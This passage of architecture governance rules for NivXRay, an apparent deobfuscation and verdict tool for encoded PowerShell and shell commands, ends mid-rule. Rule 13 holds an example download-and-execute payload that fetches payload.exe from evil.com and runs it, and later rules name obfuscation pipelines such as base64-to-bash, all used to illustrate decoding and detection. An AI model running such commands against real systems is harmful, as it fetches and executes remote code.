# NivXRay · ARB Governance Rules

Rules apply to every PR from PR-3 onward. Any implementation that
violates a rule fails ARB review by default.

---

## Rule 1 · Workspace Stability Contract

The current Production Workspace must remain usable throughout every
PR. Implementation is incremental. No partially-completed workspace
may replace the current analyst experience.

## Rule 2 · Investigation-First Contract

Every implementation decision must answer: *"which analyst question
does this solve?"* Features that don't answer an analyst question are
not implemented.

## Rule 3 · No Architectural Drift

During implementation:
- Do not introduce additional pages unless explicitly approved.
- Do not create duplicate workflows.
- Do not bypass Investigation Services.
- Do not bypass the Evidence Model.
- Do not bypass the approved data contract.

## Rule 4 · Every PR Must Be Demonstrable

Each PR includes: architecture completed · backend completed · UI
surface (if applicable) · tests · before/after screenshots (when UI
changes) · validation against the approved Blueprint.

## Rule 5 · Continuous Validation

After every PR verify Blueprint, User Journey, and Validation Matrix
are still satisfied. Implementation must not silently invalidate
approved architecture.

## Rule 6 · Documentation Synchronization

Whenever implementation changes the architecture, update Blueprint,
User Journey, and Validation Matrix in the same PR. Docs and code
stay in sync.

## Rule 7 · Preserve Future P0 Compatibility

Implementation must not require redesign when adding:
- P0 #2 Reports
- P0 #3 Detection Rules
- P0 #4 Attack Story
- P0 #5 Integrations

These must plug into the approved architecture without a rewrite.

## Rule 8 · PR Acceptance Criteria

Every PR must satisfy:
- Existing regression suite passes.
- Existing deterministic guarantees preserved.
- No increase in duplicate workflows.
- No new orphaned navigation.
- No performance regression beyond agreed thresholds.

## Rule 9 · Architecture Compliance Section (per PR)

Every PR must open with an Architecture Compliance section that maps
its work to Blueprint sections, User Journeys, and Validation Matrix
entries. Since PR-1.

## Rule 10 · Governance Table (per PR)

Since PR-2 review, every PR compliance record includes a table with
these columns:

| Blueprint Sections | Journey Sections | Validation Matrix | Tests | Regression | Risk | Rollback |

## Rule 11 · UI PR Requirements

Every UI-touching PR must include:

| Requirement | Mandatory |
|---|---|
| Screenshot (light theme) | ✅ |
| Screenshot (dark theme, if supported) | ✅ |
| Navigation Flow | ✅ |
| Keyboard Accessibility | ✅ |
| Responsive Layout Check | ✅ |
| Blueprint Section Implemented | ✅ |
| Journey Supported | ✅ |

---

## Rule 12 · Canonical Artifact Consistency Rule
**Added by ARB during PR-2.1 review · 2026-08-04**

> Once a canonical decoded artifact exists, all downstream consumers
> must consume that artifact. No consumer may independently
> re-interpret intermediate transformations.

### Consumers governed by this rule

- Investigation Summary (`investigation_report.py`)
- Runtime Simulation (`decoders/ps_normalizer.py` and any future
  runtime simulator)
- Attack Story (L2 `attack_story` service · PR-4 content)
- Executive Report (P0 #2)
- Detection Rules (P0 #3 · Sigma / KQL / Splunk / YARA generators)
- Workspace Bundle (L2 `workspace_bundle` service)
- API endpoints under `/api/investigation/*` (PR-2 wire)
- Future AI Copilot / persona-driven surfaces
- Exporters (STIX / MISP / OpenIOC / CSV)

### What the rule forbids

- A consumer computing its own `verdict` from wrapper-level evidence
  (e.g. presence of `-EncodedCommand`) while the canonical artifact
  says the decoded payload is benign.
- A consumer selecting a different terminal artifact than
  `selectCanonicalOutput` (frontend) / the L1 `EvidenceBundle`
  (backend) resolved to.
- A consumer that "helpfully" re-decodes or re-interprets an
  intermediate transformation instead of reading the artifact fields
  already produced upstream.

### What the rule requires

- The Verdict Engine reads the decoded canonical artifact plus its
  capability tags, not the wrapper opcode alone.
- Every rendered summary, story, report, rule, and export
  cross-references the same `verdict_card` (source of truth) and the
  same canonical `output`.
- Regression tests must exist for at least four cases:
  1. Benign wrapper + benign payload → identical `Informational`
     verdict across every consumer.
  2. Benign wrapper + malicious payload → identical malicious verdict
     across every consumer.
  3. Decode button and Auto Investigate button produce the same
     canonical artifact.
  4. Wrapper evidence is *retained as context* even after the
     downgrade — the analyst still sees "Encoded PowerShell" as a
     recorded MITRE T1027.010 signal, just not as the verdict driver.

### Where this rule lives in code

- **Backend**: `verdict_engine.py` is the sole verdict source; every
  formatter/reporter reads `verdict_card` (never recomputes).
- **Frontend**: `selectCanonicalOutput.js` is the sole terminal-
  artifact source; every panel reads from that.
- **Tests**: `tests/test_pr21_canonical_artifact_consistency.py`
  guards the invariant.

---

## Rule 13 · Evidence–Verdict Separation
**Added by ARB during PR-2.1 review · 2026-08-04**

> Verdicts must be driven by verified decoded behavior and capabilities,
> not by the presence of an obfuscation or encoding technique alone.
> Obfuscation contributes evidence and context, but it is not sufficient
> by itself to determine maliciousness.

### Layer model

    User Input
        ↓
    Wrapper           (Base64, EncodedCommand, gzip, XOR…)
        ↓
    Decoded Payload   (the actual script/command)
        ↓
    Behavior          (what it does)
        ↓
    Capabilities      (download · persistence · C2 · credential theft · …)
        ↓
    Verdict

### Reputation policy per layer

| Layer | What it tells us | Drives verdict? |
|---|---|---|
| Wrapper | Obfuscation technique | ❌ Not by itself |
| Payload | Actual script / command | ✅ Yes |
| Behavior | What it does | ✅ Yes |
| Capabilities | download / persistence / C2 / creds / … | ✅ Primary |
| Threat Intel | Known-bad IOC / hash / IP / URL | ✅ Strong |

### Reference cases

**Case A — same wrapper, benign payload → Informational**

    Input     : powershell.exe -EncodedCommand <base64>
    Wrapper   : EncodedCommand · Base64 · PowerShell
    Payload   : Write-Host "This comes from an encoded PS command!"
    Caps      : console-output only
    Verdict   : Informational
    Evidence  : Wrapper preserved as context (T1027.010 shown, not gating)

**Case B — same wrapper, malicious payload → High / Critical**

    Input     : powershell.exe -EncodedCommand <base64>
    Payload   : Invoke-WebRequest http://evil.com/payload.exe
                Start-Process payload.exe
    Caps      : execution + network + download
    Verdict   : High / Critical
    Evidence  : Wrapper + capability + downloader signature

The **wrapper is identical in A and B**. Only the payload's capabilities
change the verdict — that is the whole point of this rule.

### What this means for code

1. `_label_from_class_distribution` must not promote a wrapper-only
   observation to `Suspicious`. Wrapper kinds are context evidence,
   not verdict drivers.
2. The Verdict Engine reads the **decoded canonical artifact** (Rule
   12) plus its capability tags to compute the label. A wrapper marker
   with no attack capability → `Informational`.
3. Every rendered summary must show the four layers explicitly
   (Wrapper · Payload · Capabilities · Verdict) so analysts see
   *why* the verdict is what it is.
4. Any consumer that shortcuts to a verdict from a wrapper kind alone
   fails ARB review.

### Commercial differentiator

Many security tools score `Base64 + EncodedCommand + LOLBin` as
suspicious regardless of payload. NivXRay's position is:

> *"We don't stop at detecting obfuscation — we deterministically
> decode it and assess what it actually does."*

Rules 12 and 13 exist to make that position enforceable at every layer.

---

## Rule 12 · Canonical Artifact + Canonical Verdict (ratified 2026-08-04)

**Strengthened wording, replaces the PR-2.1 draft:**

> There shall be **one canonical decoded artifact** and **one canonical
> verdict object**. All UI components, APIs, reports, exports, and
> future Workspace features must consume these canonical objects
> directly. Legacy verdict fields may exist temporarily for
> compatibility but must not be used as independent decision sources.

### Concrete anchors

- Canonical artifact  → `result["output"]` (the decoded plaintext) +
  `result["output_raw"]` (untouched byte stream, when applicable).
- Canonical verdict   → `result["verdict_card"]`.
- Every other verdict-shaped field (`risk`, `semantic.review_signal`,
  `verdict_v2`, …) is either a projection of `verdict_card` or a
  supporting signal — never an independent decision source.

---

## Rule 14 · Decode / Auto Investigate Equivalence Contract

For the same input, both surfaces must produce:

- ✅ Same canonical decoded artifact
- ✅ Same verdict (verdict_card.verdict, .risk_score, .confidence)
- ✅ Same ATT&CK mapping
- ✅ Same capabilities
- ✅ Same IOC extraction
- ✅ Same runtime simulation
- ✅ Same investigation summary
- ✅ Same investigation output text

The **only** allowed differences are presentation (Auto Investigate may
add narrative sections, side-panels, deeper enrichment layers). The
analytical result may not differ. Any divergence is treated as a
regression.

---

## Rule 15 · Canonical Response Contract

Every investigation response (any endpoint that returns a decode /
analyze result) must contain:

- `canonical_artifact` (a.k.a. `output` / `output_raw`)
- `verdict_card`

Everything else — `risk`, `semantic.*`, `telemetry`, `confidence`
scalars, heuristic scores — is supporting metadata and must not be
used to render the primary verdict or the primary artifact.

Consequence: the API is self-documenting. A consumer can render a
correct top-of-page verdict knowing only these two keys.


---

## Rule 16 · Trace Layer is Best-Effort Only

**Approved**: 2026-08-05 · ARB (PR-2.2 Phase A review)

Trace generation (per-layer previews, canonical-L0 bridge outputs,
step reasoning, diff previews) is **strictly diagnostic**. It MUST
NEVER:

- alter the canonical decoded output (`det["output"]`,
  `canonical_artifact.decoded_output`),
- alter the verdict card, risk projection, or any evidence field
  (IOCs / MITRE / LOLBAS / YARA),
- alter the investigation summary, playbooks, or reports,
- influence Auto Investigate progress, phase transitions, or job
  state,
- break the request when a trace hop misbehaves.

Consequence rules for implementers:

1. Every trace-only code path MUST catch its own exceptions. Trace
   failures fall back to a safe echo entry — never propagate.
2. Trace-loop local buffers (e.g. `cur = nxt`) are scoped to the
   trace loop. The canonical output ALWAYS comes from the L0
   engine's own return value, not from any router-side reassembly.
3. Read-only bridges to the L0 registry (see
   `services/l0_bridge.py`) are permitted. Read/write bridges are
   NOT — mutating the L0 registry from the router is a
   damage-prevention violation.
4. CI / strict environments enable `L0_BRIDGE_STRICT=1` so bridge
   bugs surface pre-release. Production defaults to graceful
   fallback.
5. Trace entries carry structured `bridge_status` (`ok` / `warn` /
   `fallback`) and `bridge_reason` fields so UI badges, telemetry,
   and regression tests don't parse free-form strings.

Regression contract: `test_pr22_phase_a_trace_layer_invariant.py`
asserts the canonical artifact returned by `/api/decode/smart` is
byte-identical before/after enabling the Phase A bridge. Only
`trace[].output_preview` values become richer.



---

## Rule 17 · Canonical Consumer Rule (Permanent)

**Approved**: 2026-08-05 · ARB (after the fourth canonical-consumer
defect pattern was reported — PS `-encod` short form triggering
RC4.4 CMD Runtime Reconstruction on raw wrapper).

This rule replaces a broad, standalone consumer-audit PR with a
progressive-convergence engineering discipline. Every bug fix
brings the architecture closer to the target state without pausing
the roadmap.

### The rule

After the Canonical Evidence Recovery service (`services/
canonical_evidence_recovery.py`) produces the canonical artifact:

1. **Every new or modified downstream consumer MUST consume the
   canonical artifact.** No new code may read `body.input` for
   analytical, verdict, decoding, reporting, or presentation
   decisions.

2. **Ingress-only reads are permitted** and MUST be explicitly
   documented in a code comment naming the ingress operation
   (e.g. "raw body.input is passed to the ingress normalisation
   gate below; downstream consumers read from the canonical
   artifact"). Examples of legitimate ingress reads: ingress gate
   itself, entropy-of-raw-input observability, "did the analyst
   type anything?" empty-check.

3. **When fixing a defect in a consumer**, you MAY also correct
   directly related consumers in the same code path if they
   exhibit the same defect class. This is scope-permitted.

4. **You MUST NOT expand** the same fix into unrelated modules,
   perform broad refactors, or redesign `ops.py` — that requires
   a separate ARB-approved PR.

### Enforcement path

- Every reviewer of a PR touching `routers/ops.py`, `routers/
  analyze.py`, or any new investigation surface asks: "Does this
  new code read `body.input` or the canonical artifact?"
- If the PR reads `body.input` downstream of canonical recovery
  without explicit ingress-only justification, the PR is
  blocked.
- Existing legacy `body.input` reads are grand-fathered — they
  MUST NOT be preemptively refactored (that would violate rule
  4). But when a bug in a legacy consumer is fixed, the fix
  brings that consumer onto the canonical artifact permanently.

### Convergence

Every defect-driven fix reduces the number of legacy `body.input`
consumers. Given enough production issues, the set converges to
zero — at which point the systematic audit is unnecessary. If
defect frequency stays high after P0 completes, the ARB may
reassess whether a broader consumer audit is justified at that
point (but not before).

### Test hook

New consumers SHOULD add a targeted regression test in
`backend/tests/` that pins the canonical-consumer contract for
the specific input class the consumer handles. Format follows
`tests/test_pr212_api_parity.py`.

### Precedents (canonical-consumer conversions to date)

- **PR-2.1.2 Phase A**: `deterministic_best_decode` call site →
  Canonical Evidence Recovery Service.
- **PR-2.1.2 Phase B**: `/analyze/async` IOC / MITRE / YARA /
  LOLBAS extraction → runs on `artifact.decoded_output`.
- **PR-2.2 Phase A**: Router-side trace-replay loop → L0 bridge
  (canonical L0 ops execute against running buffer).
- **RC4.4 tweet-tweet fix (2026-08-05)**: `cmd_runtime_reconstruct`
  block guarded by `_canon_recovered` — skips when the L0 chain
  already recovered the payload.



---

## Rule 18 · One Purpose Per Box (OUTPUT Panel Discipline)

**Approved**: 2026-08-05 · Owner directive after RC4.3/RC4.4
"Reconstruction" banners polluted the OUTPUT panel and confused
analysts. Locked as a permanent UI contract.

### The rule

The **OUTPUT box** in the Analyst Workspace renders EXACTLY the
canonical decoded artifact (`canonical_artifact.decoded_output`)
for `terminal_state == "recovered"`. Nothing else. No banners, no
reconstruction reports, no verdict summaries, no runtime
simulation text, no wrapper evidence, no character-extraction
tables, no ATT&CK maps.

All supporting information MUST live in its own dedicated,
labelled card/panel above or below the OUTPUT box:

- **RECIPE** — applied ops
- **DECODING TRACE** — per-stage L0 chain + intermediate outputs
- **INVESTIGATION SUMMARY** — verdict + reasoning
- **THREAT ANALYSIS sidebar** — MITRE / LOLBAS / IOCs / rules /
  TI-hits / OSINT / FLOW / CHAIN
- **KILL-CHAIN PATH graph** — attack graph
- Future PR-4 / PR-5 / PR-6 content — each new lens or card gets
  its OWN dedicated container. Never stitched into OUTPUT.

### Enforcement

- Reviewers of any PR that touches `WorkspacePage.jsx`,
  `OutputView.jsx`, `selectCanonicalOutput.js`, or backend
  `output` / `output_raw` construction ask: "Does this add
  anything to the OUTPUT text area other than
  `canonical_artifact.decoded_output`?" If yes, the PR is
  blocked.
- Backend `result["output"]` / `result["output_raw"]` fields
  MAY continue to carry composite banners for legacy consumers,
  but the FE `selectCanonicalOutput` MUST prefer
  `canonical_artifact.decoded_output` when `terminal_state ==
  "recovered"`. This is now the pinned behaviour (verified
  2026-08-05 · tweet-tweet parity: 26 chars byte-identical
  across Decode and Auto Investigate OUTPUT boxes).
- New content classes (executive summary, attack story, MITRE
  cards, IOC cards, capability cards, reports, detection rules,
  etc.) land in their own PR-4 / PR-5 / PR-6 lens panels — never
  in the OUTPUT box.

### Terminal-state fallbacks

For non-`recovered` terminal states, the OUTPUT box may show a
concise, single-purpose message tied to that terminal state:

- `atomic_ioc` → the atomic IOC value itself (bare, one line)
- `decode_error` → single sentence: "Decoder Stability Gate —
  no deterministic recovery possible"
- `partial_recovery` → the recovered prefix text only
- `multi_fragment` → per-fragment view (existing UX)
- `passthrough` / `stability_gate` → raw input as-is

Everything else in the response still lives in its dedicated
panel.



---

## Rule 19 · Interpreter Ownership (Positive Identification Only)

**Approved**: 2026-08-05 · Owner directive after the bash
`echo "<b64>" | base64 -d | bash` mis-decode incident.

Interpreter-specific transformations (PowerShell alias normalize,
cmd env-var expansion, JS `eval`, VBS `Execute`, WMI namespace
resolution, python exec, perl `eval`, php `assert`, etc.) MUST
fire ONLY when the input positively identifies the interpreter.

### Positive interpreter identifiers (allowed to trigger)

- Explicit executable / launcher: `powershell.exe`, `pwsh`,
  `cmd.exe`, `bash`, `sh`, `/bin/bash`, `wscript.exe`,
  `mshta.exe`, `python`, `perl`, `php`, `node`, `rundll32.exe`,
  `regsvr32.exe`, `certutil.exe`, `certreq.exe`.
- Shebang: `#!/bin/bash`, `#!/usr/bin/env python`, etc.
- Script wrapper / extension in the payload: `.ps1`, `.bat`,
  `.cmd`, `.vbs`, `.js`, `.hta`, `.py`, `.pl`, `.php`.
- Language-specific syntax that ONLY that interpreter accepts —
  e.g. PowerShell `[System.X]::Y()`, `-EncodedCommand`, bash
  `${var:-default}`, VBS `CreateObject("WScript.Shell")`.

### Not sufficient (must NOT trigger interpreter normalization alone)

- Bare aliases: `echo`, `write`, `print`, `ls`, `dir`.
- Common cross-shell tokens: `|`, `&&`, `>`, `<`, `2>&1`.
- English words: `set`, `get`, `find`, `where`, `select`.
- Generic file paths.

### Enforcement

- Any L0 or router-side transformation that assumes a specific
  interpreter MUST document its positive-identification test in
  the transformation module docstring.
- Reviewers of any new transformation ask: "Under what precise
  condition does this fire? Is that condition specific to the
  claimed interpreter?" If the answer is a bare alias, the
  transformation is rejected until the guard is tightened.
- When a transformation is caught firing on a wrong interpreter
  (as `powershell-alias-normalize` did for bash `echo`), the
  IMMEDIATE fix is a pre-canonical short-circuit in
  `services/canonical_evidence_recovery.py` for the correct
  interpreter's own decoder path — NOT an in-place patch of the
  frozen L0 transformation.

### Regression-test contract

- Every new pre-canonical short-circuit MUST ship with:
  - Positive tests: N wrapper variants that all recover the
    same canonical output.
  - Negative shadow tests: at least one payload that MUST NOT
    trigger the new short-circuit (e.g. the bash decoder must
    not grab PS `-EncodedCommand` inputs).
  - Malformed-input tolerance: invalid b64 / broken wrappers
    fall through cleanly, no exceptions raised.

### Precedents

- **RC4.3 PS -EncodedCommand short-form fix (2026-08-05)** —
  positive identifier: `powershell(.exe)?` + valid PS switch
  prefix `-e[…]`.
- **decoder-bash-echo-b64-pipe (2026-08-05)** — positive
  identifier: `echo <b64> | base64 -[dD]|--decode` full pattern.



---

## Rule 20 · Plugins are Techniques, Not Samples

**Approved**: 2026-08-05 · ARB clarification after the bash /
PowerShell decoder additions raised the risk of open-ended
plugin sprawl.

### The rule

Each entry in an interpreter-owned decoder registry (Bash /
PowerShell / Cmd / JS / VBS / WMI / …) represents a **reusable
transformation or execution primitive** — never a sample-specific
fix.

- New malware samples MUST be handled by composing existing
  plugins wherever possible.
- A new plugin is added ONLY when a genuinely new *technique* is
  encountered — a class of transformation not expressible as a
  composition of existing plugins.
- Sample-driven fixes (e.g. "handle THIS specific base64 with a
  hardcoded regex") are rejected. Instead, identify the
  underlying transformation primitive and add THAT.
- Naming: plugin names reflect the primitive, not the sample.
  Good: `decoder-bash-shell-pipeline`. Bad: `decoder-lazarus-2024-bash-lotl-v2`.

### End-goal architecture (never lose sight of)

```
Input
   ↓
Interpreter Identification            (positive, Rule 19)
   ↓
Interpreter-owned Pipeline            (compose plugins)
   ↓
Canonical Artifact                    (single source of truth, Rule 17)
   ↓
Investigation                         (consumers per Rule 17)
```

Plugins are **implementation details** inside the interpreter
pipeline. The pipeline itself, the canonical artifact, and the
downstream consumers form the real architectural spine.

### Review-checklist

Any PR that adds a new decoder MUST answer:

1. What TECHNIQUE does this plugin represent? (name it in one sentence)
2. Can this be expressed as a composition of existing plugins? If
   yes, do that instead.
3. Does the plugin name describe the primitive, not the sample?
4. Are the regression tests parameterised across MULTIPLE payloads
   that exercise the same primitive with different wrappers /
   arguments?
5. Does the plugin ship with a negative test proving it doesn't
   shadow other interpreters (Rule 19 anchor)?

### Roadmap discipline (locked)

Sequence remains, no reorder without ARB approval:

1. PR-3 ARB sign-off
2. PR-4 Executive Summary + Attack Story
3. PR-5 MITRE / IOC / Capability
4. Remaining P0 roadmap items
5. P1 Corpus Expansion
6. Phase B (Stage Quality Gates)
7. Phase C (Deterministic Self-Healing)

New reported obfuscations between here and (7) are handled
through the plugin registry (composing where possible, adding a
new primitive only when needed) — never by inserting an
out-of-sequence corpus / self-healing PR.



---

## Rule 21 · Two-Track Investment · ACDE + Regression Harness

**Approved**: 2026-08-05 · Owner directive.

Regression harness and Autonomous Canonical Decoding Engine
(ACDE) are **complementary investments**, not alternatives.

### Track 1 · Regression Harness (short-term, active now)

- Location: ``backend/tests/user_reported_corpus/`` — one file per
  reported payload with expected canonical output + chain.
- Loader: ``backend/tests/test_user_reported_corpus.py`` — pytest
  that runs each payload through both `/api/decode/smart` and
  `/api/analyze/async` and asserts parity + expected outcome.
- CI gate: harness runs on every commit. Fail-fast on:
  - `terminal_state != expected_terminal_state`
  - `confidence < min_confidence`
  - `decoded_output != expected_decoded_output` (when specified)
  - Cross-endpoint parity break.
- Onboarding a new payload = add ONE fixture file. No code.

### Track 2 · Autonomous Canonical Decoding Engine (long-term)

Target architecture — the engine progressively becomes more
autonomous so analysts don't need to file bugs for every new
sample. Sequenced ACDE stages, each ARB-approved individually:

```
Incoming command
   ↓
[S1] Interpreter Identification    (PS / cmd / bash / py / js / vbs / …)
   ↓                                positive-ID only (Rule 19)
[S2] Wrapper / Encoding Detection  (b64 / hex / gzip / xor / aes / rc4 / …)
   ↓                                fingerprint-based, deterministic
[S3] Layer-Count Estimation        (how many encoding hops remain?)
   ↓                                entropy delta + printable-ratio + syntax hint
[S4] Recovery Planner              (which decoder plugin chain to run?)
   ↓                                pluggable per interpreter (Rule 20)
[S5] Deterministic Decoder Chain   (execute stage-by-stage)
   ↓
[S6] Per-Stage Output Validator    (syntax valid? entropy dropped? printable rose?)
   ↓                                Phase B (needs corpus)
[S7] Deterministic Fallback        (alternate paths within same interpreter family)
   ↓                                Phase C (needs corpus + validated gates)
Canonical Artifact
```

Sequencing (matches existing roadmap, Rule 20):
1. Continue populating interpreter-owned plugin registries as
   **techniques** (Rule 20) — S4/S5 coverage grows organically.
2. P1 Corpus Expansion — enables S3/S6 to be trained without
   false positives on legitimate enterprise commands.
3. Phase B builds S6 · Per-Stage Output Validator.
4. Phase C builds S7 · Deterministic Fallback.

### Complementarity

- Track 1 protects everything Track 2 has already achieved.
- Track 2 grows what NivXRay CAN decode on unseen inputs.
- Neither is optional; neither replaces the other.

### Reporting-loop reduction (owner's original ask)

The tool already exposes per-response signals that indicate an
unhandled sample WITHOUT requiring a human to notice: 
`terminal_state == "stability_gate"`, `confidence == 0`,
`decoded_output == raw_input` (non-passthrough). ACDE S3–S6
progressively use these signals to auto-suggest new plugins from
production traffic — closing the reporting loop as ACDE matures.



---

## Rule 22 · Failure Triage Protocol

**Approved**: 2026-08-05 · ARB correction after the initial
Track 1 harness framing risked collapsing into "add one JSON per
report" — sample-driven engineering that Rule 20 explicitly
rejects.

### The rule

Every user-reported payload that fails to decode MUST be
classified BEFORE any code or fixture is written. The
classification determines the action:

**Category A · Existing-capability regression**
The tool USED to decode this class correctly and now doesn't.
Action: fix the bug that caused the regression. Add a regression
fixture to `user_reported_corpus/` so it never regresses again.

**Category B · Existing-capability mis-selection / mis-routing**
The tool HAS the capability but isn't picking it correctly
(e.g. interpreter-ownership mis-attribution, chain-selection
tie-break error, ingress gate short-circuit missing).
Action: fix the detection/routing logic. Add a regression
fixture. No new decoder / plugin.

**Category C · Truly new transformation technique**
The tool has NEVER supported this transformation class. The
technique cannot be composed from existing plugins (Rule 20).
Action: add ONE new reusable decoder/plugin representing the
transformation primitive (not the sample). Add the fixture.
Update the interpreter's plugin registry doc.

### Enforcement

- No PR that adds a new plugin may be merged without stating
  which category the reported payload falls into. The PR
  description MUST include:
  - Classification (A / B / C)
  - Root cause statement (one sentence)
  - The transformation primitive being added (Category C only)
  - Why existing plugins cannot compose to handle it (Category
    C only)
- Reviewers reject PRs that add sample-specific logic when a
  general primitive would suffice.

### Precedent history

| Report | Category | Action |
|---|---|---|
| PS -EncodedCommand baseline (PR-2.1.2 root) | A | Fixed divergent pipelines; added fixture |
| PS -encod short form | B | Regex extension in `ps_normalizer` (routing fix) |
| bash `echo b64 \| base64 -d \| bash` | C | New primitive: shell-pipeline decoder |
| bash `echo b64 \| tr X Y \| base64 -d` | B | Composed existing plugins (SOURCE + TRANSFORM + DECODER) |
| bash `echo hex \| xxd -r -p` | C (transform primitive) | Added `xxd` DECODER plugin — reused by SOURCE/EXECUTOR |
| PS `set-item env:X …; iex (gci env:X).value` | C | New primitive: env-var reassembly |

Note that only 3 of the 6 above required NEW primitives. The
others were routing / composition fixes — validating that the
plugin architecture works.

### Roadmap discipline (unchanged, no new APIs)

Sequence remains locked (Rules 20 / 21):

1. PR-3 ARB sign-off
2. PR-4 Executive Summary + Attack Story
3. PR-5 MITRE / IOC / Capability
4. Remaining P0
5. P1 Corpus Expansion (grows organically from the seed corpus
   + gap-triage output, NOT via new APIs)
6. Phase B (Stage Quality Gates)
7. Phase C (Deterministic Self-Healing)

Explicitly REJECTED as scope creep at this stage:
- ``/api/canonical/gap-signal`` production endpoint.
- Any new API, dashboard, or infrastructure surface not on the
  approved roadmap.
- Sample-driven plugin sprawl (Rule 20 anchor).


---

## Rule 23 — Deterministic Canonical Simplification (2026-02 · ARB)

**Governance addition only. No engine change authorised by this rule.**

> Continue deterministic simplification only while the next transformation
> is **provably deterministic** and produces a **more canonical** representation.
> Stop immediately when no further deterministic simplification can be proven.

### Intent

The L0 Convergence Engine must never stop after the first successful decoder
if the result is still an unevaluated interpreter expression (e.g. a folded
PowerShell string that remains inside an unresolved `&(...)` invocation).
Equally, it must never continue past the point where the next step is a
guess. The stopping condition is a **stability gate**, not a fixed depth.

### Non-goals of Rule 23

- Does **not** authorise implementing new decoders, capabilities, or engines.
- Does **not** authorise changes to the frozen L0 (`backend/workspace/convergence/*`).
- Does **not** re-open the ARB-approved PR sequence (Rule 20 remains binding).

### When Rule 23 becomes actionable

Only after (a) the approved P0 Workspace milestones (PR-4 → PR-8) have shipped
and (b) P1 Corpus Expansion is under way. At that point the stability-gate
implementation is authorised as part of Phase B (Stage Quality Gates) or
the ACDE Phase-4/5 work (see `ROADMAP.md`). Any earlier attempt to implement
it violates Rules 20, 21, and 23 simultaneously.

### Compliance check

Reviewers must reject any PR that:
- Introduces a stability-gate implementation before Phase B / ACDE Phase 4.
- Claims Rule 23 as justification for a new decoder or engine change.
- Alters the frozen L0 convergence loop's termination logic.

Rule 23 is a **preserved architectural principle**, captured now so it is
not lost, to be implemented at the correct point in the roadmap.


---

## Rule 24 — Understand-First Decoding (IEDDE Architectural Principle) · 2026-02 · ARB

**Governance addition only. No engine change authorised by this rule.**

> NivXRay must never ask *"which decoder should I run?"*
> It must ask *"what am I looking at, what deterministic transformations
> are provably present, and is there objective evidence that another
> one is next?"*

### Intent

This rule elevates the ARB Architectural Direction captured in
`/app/memory/ARCHITECTURAL_DIRECTION_IEDDE.md` (the Intelligent
Evidence-Driven Decoding Engine) into the primary post-P0 north
star. Every future PR that touches the decoding pipeline is
evaluated against whether it moves NivXRay closer to
evidence-driven, understand-first behaviour.

### Concretely, from now on

- Every new plugin added under Rule 20 MUST declare, in its
  descriptor comment, the **interpreter it belongs to** and the
  **technique primitive it represents** so ICUE Phases 2 and 4
  can consume the registry as a technique catalogue without
  rework.
- Every new consumer added downstream of canonical recovery
  (Rule 17) MUST cite the `terminal_state`, `confidence`, and
  `stability_gate_reason` fields in its own contract so ICUE
  Phase 6 (Progress Evaluation) can attach cleanly.
- Every stability-gate message ("could not fully decode because
  …") that today returns `OUTPUT = INPUT` MUST be routed to the
  UX message contract defined in the IEDDE direction doc §4
  ("Remaining Layer: … · Reason: … · Canonical deterministic
  recovery completed.") — no silent input-echo fallbacks.

### Non-goals of Rule 24

- Does **not** authorise implementing the IEDDE planner, interpreter
  identifier, technique detector, layer discovery, or progress
  evaluator before their sequenced milestone (see ROADMAP.md and
  IEDDE.md · §10 Sequencing).
- Does **not** override Rules 20 / 21 / 22 / 23.
- Does **not** authorise LLM-based inference inside decoding. IEDDE
  is strictly deterministic.

### When Rule 24 becomes actionable in code

Only after (a) the approved P0 Workspace milestones (PR-4 → PR-8)
have shipped and (b) P1 Corpus Expansion is under way. At that
point IEDDE Stage 1 (Interpreter Identification) is authorised as
the first IEDDE deliverable.

Any earlier attempt to implement IEDDE Stage 1+ violates Rules 20 /
21 / 23 / 24 simultaneously.

### Compliance check

Reviewers MUST reject any PR that:
- Silently returns `OUTPUT = INPUT` for a non-passthrough input
  without a stability-gate reason.
- Adds a decoder that answers "which decoder should I run?"
  logic *inside* the plugin — that logic belongs to the IEDDE
  Recipe Planner (Stage 4), not the plugin.
- Claims Rule 24 as justification for an out-of-sequence IEDDE
  implementation PR.

Rule 24 is a **preserved architectural principle**, captured now so
every future PR compounds toward IEDDE rather than drifting away
from it.

---

## Rule 25 — Canonical Artifact / Investigation Metadata Split · 2026-02 · ARB

**Governance addition only. Contract for how decoding results are
presented to analysts.**

> The engine emits **two** distinct outputs:
>   1. The **Canonical Artifact** — the fully-recovered deterministic
>      script or command, and nothing else.
>   2. The **Investigation Metadata** — interpreter, original
>      launcher, flags, recovered-layer count, techniques employed,
>      residual-layer explanations.

Ratified as part of the IEDDE architectural direction (§5).

### Placement contract

- **OUTPUT panel** (`/` Workspace) MUST show the Canonical Artifact
  only. No launcher, no flag echoes, no trace, no banner text.
- **Investigation Metadata** MUST be surfaced in the L4 Workspace
  lenses:
  - **Summary lens** (PR-4) — verdict, risk, family, technique,
    canonical-state, top actions, bullets.
  - **Story lens** (PR-4) — narrative + chapters + evidence-anchored
    events.
  - **Certificate lens** (PR-6, upcoming) — final artifact hash,
    iterations executed, interpreter, launcher, flags.
  - **Raw Decode lens** (PR-6, upcoming) — trace, per-iteration
    hashes, before/after content.
- The two surfaces MUST cross-reference by anchor per §8.4 (Evidence
  Navigation Contract): every metadata field that has an evidence
  origin exposes an anchor that opens the Evidence lens at that
  iteration.

### Rule 25 becomes fully actionable when

- PR-6 lands the Certificate + Raw Decode lenses.
- IEDDE Stage 1–4 are on-line so the metadata is planner-produced,
  not scavenged from downstream heuristics.

Until then, Rule 25 is enforced *directionally* — new consumers must
respect the split when they can; existing consumers may keep their
current shape and are audited at PR-6.

### Non-goals of Rule 25

- Does **not** authorise removing fields from any existing API
  response. Backward compatibility remains binding.
- Does **not** authorise LLM-generated Investigation Metadata inside
  the deterministic pipeline.
- Does **not** authorise a UI redesign — Rule 25 is a data-contract
  rule, not a layout rule.

### Compliance check

Reviewers MUST reject any PR that:
- Emits launcher text, decoded-layer banners, or trace snippets
  inside the OUTPUT panel.
- Emits the Canonical Artifact anywhere other than the OUTPUT panel
  and the L4 Certificate lens's `canonical_artifact` field.
- Adds new investigation-metadata fields without exposing them
  through the L4 Workspace lenses.

Rule 25 exists so the analyst always sees *"what would actually
execute"* in one place, and *"how we know"* in another — never
mixed together in the OUTPUT box.



---

## Rule 26 — Discovery-Driven Planning · 2026-02 · ARB

**Governance addition. Mandatory contract for the IEDDE Recipe Planner
(IEDDE Stage 4). Not authorised for implementation until IEDDE
Stages 1–3 are on-line.**

> The Recipe Planner MUST be **discovery-driven**, not rule-order
> driven.
>
> The planner shall continuously inspect the current artifact after
> every deterministic transformation, **rediscover** newly exposed
> techniques, **rebuild** the remaining recipe if necessary, and
> **continue only while objective evidence** shows further
